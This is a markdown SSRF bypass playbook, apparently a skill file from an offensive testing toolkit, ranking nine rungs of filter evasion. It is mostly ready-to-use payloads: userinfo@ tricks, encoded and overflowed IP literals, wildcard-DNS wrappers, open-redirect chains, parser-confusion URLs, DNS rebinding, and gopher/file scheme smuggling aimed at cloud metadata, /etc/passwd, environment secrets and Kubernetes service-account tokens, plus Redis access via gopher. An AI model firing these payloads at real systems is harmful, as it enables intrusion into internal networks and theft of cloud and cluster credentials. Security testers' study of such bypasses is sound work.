# SSRF Bypass Ladder — defeat the host filter, reach internal

The sink is confirmed (OOB fired) but the raw internal URL is rejected. Walk these in
order — each rung defeats a specific, distinct filter style. A blocked first payload
is never a dead sink; it is a signal to rotate to the next rung. The goal of every
rung is the same: get the fetch to land on `169.254.169.254`, `127.0.0.1`, or an
internal host.

## Contents

- 1. `userinfo@` — substring / prefix allowlist
- 2. IP-literal encodings — string-matching denylist
- 3. Wildcard-DNS resolvers — raw IP blocked, hostname allowed
- 4. Second forgotten param — one hardened, one not
- 5. Open-redirect chain → 169.254.169.254
- 6. URL-parser confusion — parser vs fetcher disagree
- 7. DNS rebinding — TOCTOU on validate-then-fetch
- 8. Protocol / scheme smuggling — weak `http`-only filter
- 9. Case / unicode / localhost variants (last-resort combinators)
- Ladder discipline

---

## 1. `userinfo@` — substring / prefix allowlist

The allowlist does a substring or prefix match ("host not allowed" only when the
allowed string is absent). The URL authority after `@` is where the client actually
connects; the check sees the allowed host before it.

```
https://<allowed-host>@<attacker-host>/<path>
https://<allowed-host>@<attacker-host>/<uuid>/TAG        # check sees <allowed-host>, connects after @
https://<allowed-host>@169.254.169.254/latest/meta-data/iam/security-credentials/
```

Go's `net/http` converts userinfo into an `Authorization: Basic` header → the
credential can leak outbound to your host too. **This is the first bypass to try on
any "host not allowed".**

## 2. IP-literal encodings — string-matching denylist

The denylist matches the literal `127.0.0.1` / `169.254.169.254` string and never
canonicalizes. Rotate encodings — different HTTP clients accept different ones:

| Target | Encodings to try |
|---|---|
| `127.0.0.1` | decimal `2130706433`, octal `0177.0.0.1`, hex `0x7f000001`, short `127.1`, dotted-overflow `383.256.256.257`, `0.0.0.0`, `[::]`, IPv6-mapped `[::ffff:7f00:1]`, `[::ffff:127.0.0.1]` |
| `169.254.169.254` | decimal `2852039166`, hex `0xa9fea9fe`, octal `0251.0376.0251.0376`, mixed `0xa9.254.169.254`, dotted-overflow `425.510.425.510`, IPv6-mapped `[::ffff:169.254.169.254]`, `[::ffff:a9fe:a9fe]` |

**Dotted-overflow** (octets above 255) is the one most denylists miss: a regex for
`169\.254\.` does not match `425.510.425.510`, but any `inet_aton`-style parser
wraps each octet mod 256 and resolves it to the same address. Try it whenever the
plain decimal/hex forms are rejected but a dotted-quad shape is still accepted.

Seen in the wild: an image-proxy `?src=http://2130706433:9000` (decimal loopback, port
oracle); an SSRF guard that accepted `0.0.0.0`, `0177.0.0.1`, `2130706433`,
`[::ffff:7f00:1]`.

## 3. Wildcard-DNS resolvers — raw IP blocked, hostname allowed

The filter rejects raw IPs but resolves and fetches any hostname. Wrap the target IP
in a wildcard-DNS service that resolves the IP embedded in its own name:

```
169-254-169-254.sslip.io        # → 169.254.169.254
127-0-0-1.nip.io                # → 127.0.0.1
169.254.169.254.nip.io
<dashed-public-ip>.sslip.io     # wrap any target/public IP, e.g. 203-0-113-5.sslip.io
```

`sslip.io` and `nip.io` both work; `sslip.io` also supports dashes and hex forms.

## 4. Second forgotten param — one hardened, one not

Endpoints with two URL-ish params where only one is validated. The forgotten one
often flows straight into `curl_easy_setopt(CURLOPT_PROXY)` or a fetch call
unvalidated, and the internal banner leaks in the error body:

```
address + proxyaddress        # forgotten param -> CURLOPT_PROXY=http://127.0.0.1:2525 while `address` stays allowlisted
url + proxy
target + via
src + fallback
```

The internal banner appears inside a `500 Connection timed out ... <banner>` error body.
Always test every URL-ish param separately, not just the obvious one.

## 5. Open-redirect chain → 169.254.169.254

The target only allows its own domain. Point the fetch at an **allowed** URL that
issues a 302 to the internal target — the SSRF client follows the redirect:

- Host your own redirector on an allowed/attacker domain returning
  `302 Location: http://169.254.169.254/latest/meta-data/...`.
- Or chain an **on-domain open redirect** (a `?next=`/`?redirect=`/`?url=` on the
  allowed host) so validation passes on the first hop and the fetch continues inward.

This converts an otherwise-useless open redirect into an SSRF-to-metadata chain —
report the chain, not the redirect alone.

## 6. URL-parser confusion — parser vs fetcher disagree

The validator's URL parser and the HTTP client's parser disagree about the authority:

```
http://attacker\@internal
http://internal#@attacker
http://internal%2523@attacker        # double-encoded #
http://internal%00.attacker          # null truncation
http://internal%20.attacker
http://internal.\.attacker
http://[::ffff:169.254.169.254]
http://internal.attacker./            # trailing dot
http://①②⑦.⓪.⓪.①                     # enclosed alphanumerics
```

Also: trailing dot on the internal host (`169.254.169.254.`), uppercase/case-mixing,
and unicode-normalization tricks where the parser lowercases/NFKC-folds differently
than the resolver.

## 7. DNS rebinding — TOCTOU on validate-then-fetch

The allowlist resolves the name once (passes), then the client re-resolves on the
actual fetch. Serve a name that returns your IP for validation and the internal IP on
the fetch, with TTL 0:

- `rebinder`, `1u.ms`, `rbndr.us`, or your own authoritative zone with `TTL 0` and
  round-robin between attacker-IP and `169.254.169.254`.
- Works whenever there is a measurable gap between the validation resolve and the
  fetch resolve. Fire repeatedly to win the race.

## 8. Protocol / scheme smuggling — weak `http`-only filter

When the scheme filter is weak or absent, escape HTTP entirely:

```
gopher://127.0.0.1:6379/_<urlencoded-redis-commands>   # Redis/memcached/SMTP/raw HTTP → can reach RCE
gopher://127.0.0.1:11211/_...                           # memcached
dict://127.0.0.1:6379/info                              # banner/interaction
file:///etc/passwd                                       # local file read
file:///proc/self/environ                                # env / secrets
file:///var/run/secrets/kubernetes.io/serviceaccount/token   # k8s SA token
ftp://, ldap://, sftp://
php://filter/..., expect://id                            # PHP stacks
jar:http://internal!/  , netdoc:                          # Java stacks
```

`gopher://` is the RCE-capable one — it lets you send arbitrary bytes to a TCP
service. **Read/interact to prove reach; do NOT send state-changing Redis commands
(`SET`/`CONFIG`/`FLUSHALL`) against real infra** — that is rung-5 destruction (pause
+ ask). Prove you can talk to the service (an `INFO`/banner read), then report.

## 9. Case / unicode / localhost variants (last-resort combinators)

`localhost`, `LOCALHOST`, `localhost.`, `127.0.0.1.`, `[::1]`, `0::1`, `0`,
`0x0`, `2130706433.`, `spoofed.<attacker>` CNAME'd to internal, and combining any two
rungs (e.g. `userinfo@` + decimal, or `sslip.io` behind an open redirect).

---

## Ladder discipline

Rotate rungs against a **confirmed** sink — do not re-fire one blocked payload. If
all nine rungs are exhausted on a sink with a hard, canonicalizing SSRF-guard, note
the sink as "guard canonicalizes + denylists all forms tried" in `notes/` and rotate
to the next sink or a different angle (blind oracle, second param elsewhere) — never
close the target. The instant one rung lands internal, jump to
`cloud-metadata.md`.
